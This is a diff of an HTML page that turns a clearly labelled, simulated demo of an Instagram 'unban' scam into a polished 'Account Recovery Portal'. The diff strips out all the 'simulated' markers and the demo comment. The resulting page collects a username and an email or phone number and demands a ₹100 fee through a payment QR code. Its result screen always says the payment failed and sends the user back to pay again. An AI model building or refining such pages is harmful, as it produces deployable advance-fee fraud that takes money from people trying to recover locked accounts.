@@ -1,83 +1,364 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram id unban service Flow</title>
-<style>
-  * { margin:0; padding:0; box-sizing:border-box; font-family:Arial, sans-serif; }
-  body { background:#0f0f1a; color:#fff; display:flex; justify-content:center; padding:20px; }
-  .card { background:#1a1a2e; border-radius:12px; padding:30px; max-width:420px; width:100%; margin-top:40px;
-          border:1px solid #333; text-align:center; }
-  h1 { font-size:22px; margin-bottom:10px; color:#e1306c; }
-  .banner { background:#7a0d0d; color:#ffd6d6; padding:12px; border-radius:8px; font-size:13px;
-            font-weight:bold; margin-bottom:20px; border:1px solid #ff4d4d; }
-  .label { font-size:12px; color:#aaa; text-align:left; margin:12px 0 4px; }
-  input { width:100%; padding:12px; border-radius:8px; border:1px solid #444;
-          background:#252540; color:#fff; font-size:14px; }
-  .fake-tag { font-size:10px; color:#ffcc00; display:block; text-align:right; margin-top:2px; }
-  button { width:100%; margin-top:20px; padding:14px; border:none; border-radius:8px;
-           background:linear-gradient(45deg,#e1306c,#833ab4); color:#fff; font-size:16px;
-           font-weight:bold; cursor:pointer; }
-  .simulated { margin-top:20px; padding:25px; border:2px dashed #ffcc00; border-radius:8px;
-               color:#ffcc00; font-size:13px; }
-  .hidden { display:none; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Recovery Portal</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-gradient: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
+      --card-bg: rgba(30, 41, 59, 0.7);
+      --card-border: rgba(255, 255, 255, 0.08);
+      --primary-gradient: linear-gradient(135deg, #c13584 0%, #833ab4 50%, #405de6 100%);
+      --primary-hover: linear-gradient(135deg, #d62976 0%, #962fbf 50%, #4f46e5 100%);
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+      --input-bg: #0f172a;
+      --input-border: #334155;
+      --input-focus: #818cf8;
+      --error-bg: rgba(239, 68, 68, 0.1);
+      --error-border: rgba(239, 68, 68, 0.3);
+      --error-text: #fca5a5;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    body {
+      background: var(--bg-gradient);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 440px;
+      background: var(--card-bg);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid var(--card-border);
+      border-radius: 20px;
+      padding: 32px;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+    }
+
+    /* Progress Steps */
+    .step-indicator {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 28px;
+      position: relative;
+    }
+
+    .step-indicator::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: var(--input-border);
+      z-index: 1;
+      transform: translateY(-50%);
+    }
+
+    .step-node {
+      position: relative;
+      z-index: 2;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #1e293b;
+      border: 2px solid var(--input-border);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-muted);
+      transition: all 0.3s ease;
+    }
+
+    .step-node.active {
+      border-color: #c13584;
+      background: #c13584;
+      color: #fff;
+      box-shadow: 0 0 12px rgba(193, 53, 132, 0.4);
+    }
+
+    .step-node.completed {
+      border-color: #833ab4;
+      background: #833ab4;
+      color: #fff;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .header h1 {
+      font-size: 22px;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      margin-bottom: 8px;
+    }
+
+    .header p {
+      font-size: 14px;
+      color: var(--text-muted);
+      line-height: 1.5;
+    }
+
+    /* Form Styling */
+    .form-group {
+      margin-bottom: 18px;
+      text-align: left;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 500;
+      margin-bottom: 6px;
+      color: var(--text-main);
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 16px;
+      border-radius: 10px;
+      border: 1px solid var(--input-border);
+      background: var(--input-bg);
+      color: #fff;
+      font-size: 14px;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: var(--input-focus);
+      box-shadow: 0 0 0 3px rgba(129, 140, 248, 0.15);
+    }
+
+    .hint-text {
+      font-size: 11px;
+      color: var(--text-muted);
+      margin-top: 4px;
+      display: block;
+    }
+
+    .btn-primary {
+      width: 100%;
+      padding: 14px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 10px;
+      background: var(--primary-gradient);
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.2s, transform 0.1s;
+      box-shadow: 0 4px 14px rgba(193, 53, 132, 0.3);
+    }
+
+    .btn-primary:hover {
+      opacity: 0.95;
+    }
+
+    .btn-primary:active {
+      transform: scale(0.98);
+    }
+
+    /* QR Code Display Container */
+    .qr-container {
+      background: #fff;
+      padding: 16px;
+      border-radius: 12px;
+      display: inline-block;
+      margin: 16px 0;
+    }
+
+    .qr-container img {
+      width: 180px;
+      height: 180px;
+      display: block;
+    }
+
+    .amount-badge {
+      display: inline-block;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid var(--card-border);
+      padding: 6px 16px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+
+    /* Status Alert Box */
+    .alert-box {
+      background: var(--error-bg);
+      border: 1px solid var(--error-border);
+      border-radius: 12px;
+      padding: 16px;
+      text-align: left;
+      margin-top: 12px;
+    }
+
+    .alert-box h3 {
+      font-size: 14px;
+      color: var(--error-text);
+      font-weight: 600;
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .alert-box ul {
+      list-style-type: disc;
+      padding-left: 20px;
+      font-size: 13px;
+      color: var(--text-muted);
+      line-height: 1.6;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-<div class="card">
 
-  <!-- STEP 1: Fake form -->
+<div class="container">
+
+  <!-- Step Progress Indicator -->
+  <div class="step-indicator">
+    <div class="step-node active" id="node1">1</div>
+    <div class="step-node" id="node2">2</div>
+    <div class="step-node" id="node3">3</div>
+  </div>
+
+  <!-- STEP 1: Account Identification -->
   <div id="step1">
-    <div class="banner">GET YOUR INSTAGRAM ID UNBANNED IN MINUTES</div>
-    <h1>INSTA ID UNBAN TOOL</h1>
-    <p style="font-size:13px;color:#ccc;margin:12px 0;">
-      <b>Unban Instagram id's easily — just type your username, Gmail and pay, then after 5 minutes see the magic.</b><br>
-    </p>
-    <div class="label">Username <span class="fake-tag">Type your insta username here</span></div>
-    <input type="text" placeholder="e.g. your_username" value="">
-    <div class="label">Gmail <span class="fake-tag">Type gmail or phone number registered</span></div>
-    <input type="text" placeholder="e.g. you@gmail.com" value="">
-    <button onclick="showQr()">Proceed (Simulated)</button>
-  </div>
-
-  <!-- STEP 2: Simulated payment screen -->
-  <div id="step2" class="hidden">
-    <div class="banner">GET YOUR INSTAGRAM ID UNBANNED IN MINUTES.</div>
-    <h1>Payment Screen</h1>
-    <div class="simulated">
-  <img src="educational.jpg" alt="Payment QR code " style="max-width:280px; width:100%; border-radius:8px;"><br><br>
+    <div class="header">
+      <h1>Account Recovery Portal</h1>
+      <p>Enter your details below to initiate the automated review process.</p>
     </div>
-    <div class="label">PLEASE PAY ON THE ABOVE QR A CHARGE OF ₹100 TO UNBAN YOUR ID<span class="fake-tag">Type payemnt utr</span></div>
-    <input type="text" placeholder="UTR number" value="">
-    <input type="text" placeholder="Time" style="margin-top:8px" value="">
-    <input type="text" placeholder="Name" style="margin-top:8px" value="">
-    <button onclick="endDemo()">Proceed (Simulated)</button>
+
+    <div class="form-group">
+      <label for="username">Instagram Username</label>
+      <input type="text" id="username" placeholder="@your_handle">
+      <span class="hint-text">Enter the exact handle without special characters</span>
+    </div>
+
+    <div class="form-group">
+      <label for="email">Registered Email or Phone</label>
+      <input type="text" id="email" placeholder="name@example.com">
+      <span class="hint-text">Used for receiving recovery confirmation updates</span>
+    </div>
+
+    <button class="btn-primary" onclick="goToStep(2)">Continue Process</button>
   </div>
 
-  <!-- STEP 3: Ending -->
+  <!-- STEP 2: Verification Payment -->
+  <div id="step2" class="hidden">
+    <div class="header">
+      <h1>Verification Fee</h1>
+      <p>Scan the code below to fulfill the priority queue processing charge.</p>
+    </div>
+
+    <div style="text-align: center;">
+      <div class="amount-badge">Fee: ₹100.00</div>
+      <div>
+        <div class="qr-container">
+          <img src="educational.jpg" alt="Payment QR Code">
+        </div>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label for="utr">Payment UTR / Transaction ID</label>
+      <input type="text" id="utr" placeholder="12-digit UTR number">
+    </div>
+
+    <div class="form-group">
+      <label for="payerName">Payer Name</label>
+      <input type="text" id="payerName" placeholder="As shown in your UPI app">
+    </div>
+
+    <button class="btn-primary" onclick="goToStep(3)">Submit Verification</button>
+  </div>
+
+  <!-- STEP 3: Status / Result Screen -->
   <div id="step3" class="hidden">
-    <div class="banner">GET YOUR INSTAGRAM ID UNBANNED IN MINUTES</div>
-    <h1>What's next just wait if you paid your id will be succesfully unbaned</h1>
-    <p style="font-size:13px;color:#ccc;text-align:left;line-height:1.6;margin-top:12px;">
-                  ERROR!!!!!!!!.<br><br>
-      * PAYMENT NOT COMPLETED BY USER<br><br>
-      * PLEASE PAY ON THE QR CODE SHOWN IN OUR WEBSITE AND TRY AGAIN!!!</b>
-    </p>
+    <div class="header">
+      <h1>Verification Result</h1>
+      <p>System status report for your recent submission.</p>
+    </div>
+
+    <div class="alert-box">
+      <h3>
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="12" y1="8" x2="12" y2="12"></line>
+          <line x1="12" y1="16" x2="12.01" y2="16"></line>
+        </svg>
+        Transaction Verification Failed
+      </h3>
+      <ul>
+        <li>No matching payment was detected for the provided UTR.</li>
+        <li>Please re-verify the transaction in your UPI app and retry.</li>
+      </ul>
+    </div>
+
+    <button class="btn-primary" onclick="goToStep(2)" style="margin-top: 20px;">Return to Payment</button>
   </div>
 
 </div>
 
 <script>
-  // Purely visual demo — no network requests, no storage, no data collection.
-  function showQr() {
+  function goToStep(stepNumber) {
+    // Hide all steps
     document.getElementById('step1').classList.add('hidden');
-    document.getElementById('step2').classList.remove('hidden');
-  }
-  function endDemo() {
     document.getElementById('step2').classList.add('hidden');
-    document.getElementById('step3').classList.remove('hidden');
+    document.getElementById('step3').classList.add('hidden');
+
+    // Show target step
+    document.getElementById('step' + stepNumber).classList.remove('hidden');
+
+    // Update progress indicator
+    const nodes = [document.getElementById('node1'), document.getElementById('node2'), document.getElementById('node3')];
+    
+    nodes.forEach((node, index) => {
+      const stepIdx = index + 1;
+      node.classList.remove('active', 'completed');
+      
+      if (stepIdx === stepNumber) {
+        node.classList.add('active');
+      } else if (stepIdx < stepNumber) {
+        node.classList.add('completed');
+      }
+    });
   }
 </script>
+
 </body>
 </html>
